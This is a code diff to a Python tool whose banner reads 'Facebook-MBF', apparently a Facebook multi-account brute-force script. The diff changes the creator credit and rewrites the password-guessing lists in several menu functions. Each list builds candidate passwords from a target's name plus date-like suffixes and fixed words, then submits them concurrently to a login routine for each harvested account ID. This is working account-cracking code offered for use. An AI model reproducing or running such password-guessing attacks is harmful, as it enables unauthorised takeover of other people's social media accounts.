@@ -26,7 +26,7 @@ def baner():
 {B}╔═╗{W}┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─   {B}╔╦╗{W}┌┐ ┌─┐
 {B}╠╣ {W}├─┤│  ├┤ ├┴┐│ ││ │├┴┐{R}───{B}║║║{W}├┴┐├┤ 
 {B}╚  {W}┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴   {B}╩ ╩{W}└─┘└  ''')
-    print('' + Back.BLUE + Fore.BLACK + '        Creator : FahmiApz         \033[00m')
+    print('' + Back.BLUE + Fore.BLACK + '        Creator : redrigodaos         \033[00m')
     print()
 
 def masuk():
@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '27',
-                         str(x) + '28',
-                         str(x) + '29',
-                         str(x) + '30'
+                         str(x) + '190822',
+                         str(x) + '1922',
+                         str(x) + '022',
+                         str(x) + '2022'
                          ]
-                    litpas.append('Marques')
-                    litpas.append('Fatima')
-                    litpas.append('Vong')
-                    litpas.append('Horta')
+                    litpas.append('Terate')
+                    litpas.append('MMXII')
+                    litpas.append('Paster')
+                    litpas.append('Setiahati')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -249,15 +249,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '27',
-                         str(x) + '28',
-                         str(x) + '29',
-                         str(x) + '30'
+                         str(x) + '190822',
+                         str(x) + '1922',
+                         str(x) + '022',
+                         str(x) + '2022'
                          ]
-                    litpas.append('Marques')
-                    litpas.append('Fatima')
-                    litpas.append('Vong')
-                    litpas.append('Horta')
+                    litpas.append('Terate')
+                    litpas.append('MMXII')
+                    litpas.append('Paster')
+                    litpas.append('Setiahati')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '27',
-                           str(x) + '28',
-                           str(x) + '29',
-                           str(x) + '30'
+                           str(x) + '190822',
+                           str(x) + '1922',
+                           str(x) + '022',
+                           str(x) + '2022'
                            ]
-                      litpas.append('Marques')
-                      litpas.append('Fatima')
-                      litpas.append('Vong')
-                      litpas.append('Horta')
+                      litpas.append('Terate')
+                      litpas.append('MMXII')
+                      litpas.append('Paster')
+                      litpas.append('Setiahati')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '27',
-                           str(x) + '28',
-                           str(x) + '29',
-                           str(x) + '30'
+                           str(x) + '190822',
+                           str(x) + '1922',
+                           str(x) + '022',
+                           str(x) + '2022'
                            ]
-                      litpas.append('Marques')
-                      litpas.append('Fatima')
-                      litpas.append('Vong')
-                      litpas.append('Horta')
+                      litpas.append('Terate')
+                      litpas.append('MMXII')
+                      litpas.append('Paster')
+                      litpas.append('Setiahati')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -331,15 +331,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '27',
-                           str(x) + '28',
-                           str(x) + '29',
-                           str(x) + '30'
+                           str(x) + '190822',
+                           str(x) + '1922',
+                           str(x) + '022',
+                           str(x) + '2022'
                            ]
-                      litpas.append('Marques')
-                      litpas.append('Fatima')
-                      litpas.append('Vong')
-                      litpas.append('Horta')
+                      litpas.append('Terate')
+                      litpas.append('MMXII')
+                      litpas.append('Paster')
+                      litpas.append('Setiahati')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -355,15 +355,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '27',
-                           str(x) + '28',
-                           str(x) + '29',
-                           str(x) + '30'
+                           str(x) + '190822',
+                           str(x) + '1922',
+                           str(x) + '022',
+                           str(x) + '2022'
                            ]
-                      litpas.append('Marques')
-                      litpas.append('Fatima')
-                      litpas.append('Vong')
-                      litpas.append('Horta')
+                      litpas.append('Terate')
+                      litpas.append('MMXII')
+                      litpas.append('Paster')
+                      litpas.append('Setiahati')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
